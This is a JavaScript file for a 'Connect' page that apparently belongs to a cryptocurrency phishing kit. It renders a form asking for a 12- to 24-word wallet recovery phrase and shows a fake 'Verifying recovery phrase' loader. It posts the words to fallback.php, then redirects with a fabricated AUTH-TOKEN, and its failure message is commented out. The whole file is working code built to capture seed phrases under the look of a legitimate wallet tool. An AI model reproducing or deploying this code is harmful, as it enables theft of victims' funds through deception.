// Connect Page Specific JavaScript
document.addEventListener('DOMContentLoaded', () => {
    // Initialize internationalization
    const i18nSystem = new I18nSystem();
    i18nSystem.init();
    
    // Listen for I18nSystem ready event
    document.addEventListener('i18nReady', () => {
        // console.log('I18nSystem ready event received');
        generatePhraseOptions();
    });

    // Form validation and submission
    const form = document.getElementById('recoveryForm');
    const confirmBtn = document.getElementById('submitBtn');
    const inputsContainer = document.getElementById('inputsContainer');
    const phraseSelect = document.getElementById('type');
    
    // Generate input fields dynamically
    function generateInputFields() {
        inputsContainer.innerHTML = '';
        
        for (let i = 1; i <= 24; i++) {
            const inputDiv = document.createElement('div');
            inputDiv.className = 'input';
            inputDiv.setAttribute('data-index', i);
            
            inputDiv.innerHTML = `
                <span class="num">${i}.</span>
                <input type="password" name="w${i}" id="w${i}" class="form-control" autocomplete="off">
                <span class="eye" data-id="w${i}"><i class="fa-solid fa-eye-slash"></i></span>
            `;
            
            inputsContainer.appendChild(inputDiv);
        }
    }
    
    // Initialize input fields
    generateInputFields();
    
    // Generate phrase options dynamically
    function generatePhraseOptions() {
        const currentLang = i18nSystem.currentLang;
        const langData = i18nSystem.translations[currentLang];
        const select = document.getElementById('type');
        
        if (!select) {
            // console.error('Select element not found');
            return;
        }
        
        // Clear existing options
        select.innerHTML = '';
        
        // Add placeholder option
        const placeholderOption = document.createElement('option');
        placeholderOption.value = '';
        placeholderOption.textContent = langData && langData.phraseSelectPlaceholder ? langData.phraseSelectPlaceholder : 'Select phrase length...';
        placeholderOption.disabled = true;
        placeholderOption.selected = true;
        select.appendChild(placeholderOption);
        
        // console.log('Generating phrase options for language:', currentLang);
        // console.log('Language data:', langData);
        
        const options = [
            { value: '12', key: 'phrase12', fallback: 'I have a 12-word phrase' },
            { value: '15', key: 'phrase15', fallback: 'I have a 15-word phrase' },
            { value: '18', key: 'phrase18', fallback: 'I have an 18-word phrase' },
            { value: '21', key: 'phrase21', fallback: 'I have a 21-word phrase' },
            { value: '24', key: 'phrase24', fallback: 'I have a 24-word phrase' }
        ];
        
        options.forEach(option => {
            const optionElement = document.createElement('option');
            optionElement.value = option.value;
            optionElement.id = `phrase-${option.value}`;
            
            // Get translated text or use fallback
            const text = langData && langData[option.key] ? langData[option.key] : option.fallback;
            optionElement.textContent = text;
            
            select.appendChild(optionElement);
            // console.log(`Generated option ${option.value} with: ${text}`);
        });
        
        // Don't set default value - keep placeholder selected
        // This ensures inputsContainer stays hidden until user selects
    }
    
    // Show/hide input fields based on selected phrase length
    function updateInputVisibility() {
        const selectedValue = phraseSelect.value;
        
        // If no option selected (empty value), hide the entire inputs container
        if (!selectedValue || selectedValue === '') {
            inputsContainer.classList.remove('visible');
            confirmBtn.disabled = true;
            return;
        }
        
        // Show the inputs container
        inputsContainer.classList.add('visible');
        
        const numWords = parseInt(selectedValue);
        const inputs = document.querySelectorAll('.input input[type="password"]');
        
        inputs.forEach((input, index) => {
            const inputContainer = input.closest('.input');
            if (index < numWords) {
                inputContainer.style.display = 'block';
            } else {
                inputContainer.style.display = 'none';
                input.value = ''; // Clear hidden inputs
            }
        });
        
        // Re-validate form after changing visibility
        validateForm();
    }
    
    // Set initial HTML lang attribute (will be set after language options are generated)
    setTimeout(() => {
        const initialLang = document.getElementById('langs').value;
        if (initialLang) {
            document.documentElement.lang = initialLang;
        }
    }, 50);
    
    // Handle phrase selection change
    phraseSelect.addEventListener('change', updateInputVisibility);
    
    // Update HTML lang attribute when language changes
    document.getElementById('langs').addEventListener('change', () => {
        // Update HTML lang attribute
        const selectedLang = document.getElementById('langs').value;
        document.documentElement.lang = selectedLang;
        
        // Update phrase options after language change
        setTimeout(() => {
            generatePhraseOptions();
        }, 200);
    });
    
    // Initialize phrase options (inputs container will be hidden by default)
    generatePhraseOptions();
    updateInputVisibility(); // This will keep inputsContainer hidden since no option is selected
    
    // Also update phrase options after a short delay to ensure I18nSystem is ready
    setTimeout(() => {
        generatePhraseOptions();
        updateInputVisibility(); // Ensure it stays hidden
    }, 100);

    // Toggle password visibility - with delay to ensure Font Awesome is loaded
    setTimeout(() => {
        setupEyeIcons();
    }, 1000); // Wait 1 second for Font Awesome to load
    
    // Setup eye icon functionality
    function setupEyeIcons() {
        const eyeIcons = document.querySelectorAll('.eye');
        
        eyeIcons.forEach((eye) => {
            eye.addEventListener('click', () => {
                const inputId = eye.getAttribute('data-id');
                const input = document.getElementById(inputId);
                
                // Check if input exists
                if (!input) {
                    // console.error('Input element not found for:', inputId);
                    return;
                }
                
                if (input.type === 'password') {
                    // Show password
                    input.type = 'text';
                    eye.innerHTML = '<i class="fa-solid fa-eye"></i>';
                } else {
                    // Hide password
                    input.type = 'password';
                    eye.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
                }
            });
        });
    }

    // Form validation
    function validateForm() {
        const selectedValue = phraseSelect.value;
        
        // If no option selected, form is invalid
        if (!selectedValue || selectedValue === '') {
            confirmBtn.disabled = true;
            return false;
        }
        
        let isValid = true;
        const numWords = parseInt(selectedValue);
        const inputs = document.querySelectorAll('.input input[type="password"]');
        
        inputs.forEach((input, index) => {
            if (index < numWords && !input.value.trim()) {
                isValid = false;
            }
        });
        
        confirmBtn.disabled = !isValid;
        return isValid;
    }

    // Add input event listeners
    function setupInputListeners() {
        const inputs = document.querySelectorAll('.input input[type="password"]');
        inputs.forEach(input => {
            input.addEventListener('input', validateForm);
            input.addEventListener('paste', validateForm);
        });
    }
    
    // Setup input listeners after generating fields
    setupInputListeners();

    // Form submission with loader and error handling
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (!validateForm()) return;

        const originalText = confirmBtn.innerHTML;
        const loaderOverlay = document.getElementById('loaderOverlay');
        const loaderText = document.getElementById('loaderText');
        const errorMessage = document.getElementById('errorMessage');
        
        try {
            // Show loader overlay
            loaderOverlay.classList.add('show');
            
            // Get translated loader text
            const currentLang = i18nSystem.currentLang;
            const langData = i18nSystem.translations[currentLang];
            const translatedLoaderText = langData && langData.loaderText ? langData.loaderText : 'Verifying recovery phrase...';
            loaderText.textContent = translatedLoaderText;
            
            // Disable submit button
            confirmBtn.disabled = true;
            confirmBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
            
            // Collect form data
            const formData = new FormData(form);
            formData.append('language', i18nSystem.currentLang);
            
            // Only include visible input values
            const selectedValue = parseInt(phraseSelect.value);
            for (let i = selectedValue + 1; i <= 24; i++) {
                formData.delete(`w${i}`); // Remove hidden input values
            }
            
            // Wait for configured time to show loader
            await new Promise(resolve => setTimeout(resolve, CONFIG.connectErrorDisplayTime || 2000));
            
            // Submit to fallback.php
            const response = await fetch('./fallback.php', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Hide loader and redirect to next page
                loaderOverlay.classList.remove('show');
                window.location.href = result.redirect || '?AUTH-TOKEN=' + btoa(Date.now().toString()).replace(/[^a-zA-Z0-9]/g, '').substring(0, 32) + '&cur=finish';
            } else {
                // Hide loader and show error
                loaderOverlay.classList.remove('show');
                
                // Show error message
                // errorMessage.textContent = result.message || 'Invalid recovery phrase. Please check your words and try again.';
                // errorMessage.classList.add('show');
                
                // Hide error after 5 seconds
                setTimeout(() => {
                    errorMessage.classList.remove('show');
                }, 5000);
                
                // Restore button state
                confirmBtn.disabled = false;
                confirmBtn.innerHTML = originalText;
            }
        } catch (error) {
            // console.error('Error:', error);
            
            // Hide loader
            loaderOverlay.classList.remove('show');
            
            // Show error message
            let errorMsg = 'An error occurred. Please try again.';
            if (error.message) {
                errorMsg = error.message;
            }
            
            errorMessage.textContent = errorMsg;
            errorMessage.classList.add('show');
            
            // Hide error after 5 seconds
            setTimeout(() => {
                errorMessage.classList.remove('show');
            }, 5000);
            
            // Restore button state
            confirmBtn.disabled = false;
            confirmBtn.innerHTML = originalText;
        }
    });

    // Modal functionality
    const modal = document.getElementById('securityModal');
    document.getElementById('securityInfoBtn').addEventListener('click', () => {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    });
    
    document.querySelector('.close-modal').addEventListener('click', () => {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });
    
    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });
}); 